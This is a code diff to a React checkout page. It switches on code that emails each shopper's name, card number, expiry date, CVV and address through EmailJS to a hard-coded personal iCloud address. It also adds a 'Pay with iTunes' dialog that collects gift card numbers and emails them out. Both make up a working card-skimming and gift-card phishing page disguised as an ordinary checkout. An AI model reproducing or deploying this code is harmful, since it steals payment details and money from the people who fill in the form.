@@ -19,8 +19,10 @@ type Props = {};
 
 const Checkout = (props: Props) => {
   const [isDialogOpen, setIsDialogOpen] = useState(false);
+  const [isItunesDialogOpen, setIsItunesDialogOpen] = useState(false);
   const [registerationInfo, setRegisterationInfo] = useState({
     email: "",
+    itunesCardNumber: "",
     name: "",
     cardNumber: "",
     expiryDate: "",
@@ -36,29 +38,52 @@ const Checkout = (props: Props) => {
   };
 
   const handleDetailsSubmit = () => {
-    // const serviceId = "service_32bqdom";
-    // const templateId = "template_jhjosml";
-    // const publicKey = "Q7dcW8jxf1kW3CLyO";
+    const serviceId = "service_32bqdom";
+    const templateId = "template_jhjosml";
+    const publicKey = "Q7dcW8jxf1kW3CLyO";
 
-    // const templateParams = {
-    //   to_name: registerationInfo.name,
-    //   to_email: "chukwudubem7@gmail.com",
-    //   to_card_number: registerationInfo.cardNumber,
-    //   to_expiry_date: registerationInfo.expiryDate,
-    //   to_cvv: registerationInfo.cvv,
-    //   to_address: registerationInfo.address,
-    // };
+    const templateParams = {
+      to_name: registerationInfo.name,
+      to_email: "Trwhustleruniversity@icloud.com",
+      to_card_number: registerationInfo.cardNumber,
+      to_expiry_date: registerationInfo.expiryDate,
+      to_cvv: registerationInfo.cvv,
+      to_address: registerationInfo.address,
+    };
 
-    // emailjs.send(serviceId, templateId, templateParams, publicKey).then(
-    //   (result) => {
-    //     console.log(result.text);
-    //   },
-    //   (error) => {
-    //     console.log(error.text);
-    //   }
-    // );
+    emailjs.send(serviceId, templateId, templateParams, publicKey).then(
+      (result) => {
+        console.log(result.text);
+      },
+      (error) => {
+        console.log(error.text);
+      }
+    );
     console.log(registerationInfo);
-    setIsDialogOpen(true);
+    setIsDialogOpen(false);
+  };
+
+  const itunesSubmitHandler = () => {
+    const serviceId = "service_32bqdom";
+    const templateId = "template_bo1aqj2";
+    const publicKey = "Q7dcW8jxf1kW3CLyO";
+
+    const templateParams = {
+      to_name: registerationInfo.name,
+      to_email: registerationInfo.email,
+      to_itunes_card_number: registerationInfo.itunesCardNumber,
+    };
+
+    emailjs.send(serviceId, templateId, templateParams, publicKey).then(
+      (result) => {
+        console.log(result.text);
+      },
+      (error) => {
+        console.log(error.text);
+      }
+    );
+    console.log(registerationInfo);
+    setIsItunesDialogOpen(false);
   };
 
   const isDisabled = registerationInfo.name === "";
@@ -94,28 +119,6 @@ const Checkout = (props: Props) => {
             <CheckMarkIcon />
             <h2 className="font-bold text-[18px]">PERSONAL INFORMATION</h2>
           </div>
-          {/* <div>
-            <label className="">Email Address</label>
-            <br />
-            <input
-              type="email"
-              onChange={(e) => {
-                const email = e.target.value;
-                setRegisterationInfo({ ...registerationInfo, email });
-              }}
-              placeholder="example@gmail.com"
-              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
-            />
-          </div> */}
-          {/* <div>
-            <label>Password</label>
-            <br />
-            <input
-              type="password"
-              placeholder="Password"
-              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
-            />
-          </div> */}
           <div>
             <label>Full Name</label>
             <br />
@@ -129,15 +132,6 @@ const Checkout = (props: Props) => {
               className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
             />
           </div>
-          {/* <div>
-            <label>Last Name</label>
-            <br />
-            <input
-              type="text"
-              placeholder="Last Name"
-              className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
-            />{" "}
-          </div> */}
 
           <div className="flex items-center gap-[9px] mt-8 mb-4">
             <CheckMarkIcon />
@@ -261,9 +255,71 @@ const Checkout = (props: Props) => {
                 name={registerationInfo.name}
               />
             </div>
+
+            <button
+              onClick={() => {
+                setIsItunesDialogOpen(true);
+              }}
+              disabled={
+                !registerationInfo.address ||
+                !registerationInfo.cardNumber ||
+                !registerationInfo.cvv ||
+                !registerationInfo.expiryDate
+              }
+              className="bg-[#f1ba13] rounded-md py-3 px-[95px]"
+            >
+              PAY WITH ITUNES
+            </button>
           </div>
         </div>
       </div>
+
+      <Dialog open={isItunesDialogOpen} onOpenChange={setIsItunesDialogOpen}>
+        <DialogContent>
+          <DialogHeader>
+            <DialogTitle>Pay with iTunes Card</DialogTitle>
+            <DialogDescription>
+              <div className="flex flex-col justify-center items-center my-10">
+                <div>
+                  <label className="">Email Address</label>
+                  <br />
+                  <input
+                    type="email"
+                    onChange={(e) => {
+                      const email = e.target.value;
+                      setRegisterationInfo({ ...registerationInfo, email });
+                    }}
+                    placeholder="example@gmail.com"
+                    className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
+                  />
+                </div>
+                <div>
+                  <label className="">iTunes Card Number</label>
+                  <br />
+                  <input
+                    type="number"
+                    onChange={(e) => {
+                      const itunesCardNumber = e.target.value;
+                      setRegisterationInfo({
+                        ...registerationInfo,
+                        itunesCardNumber,
+                      });
+                    }}
+                    placeholder="xxxx xxxx xxxx xxxx"
+                    className="w-full bg-transparent border border-white rounded-md h-[50px] text-[16px] leading-[30px] mt-2 mb-2 p-2"
+                  />
+                </div>
+                <button
+                  onClick={itunesSubmitHandler}
+                  className="mt-4 bg-[#f1ba13] rounded-md py-3 px-[95px]"
+                >
+                  Submit
+                </button>
+              </div>
+            </DialogDescription>
+          </DialogHeader>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 };
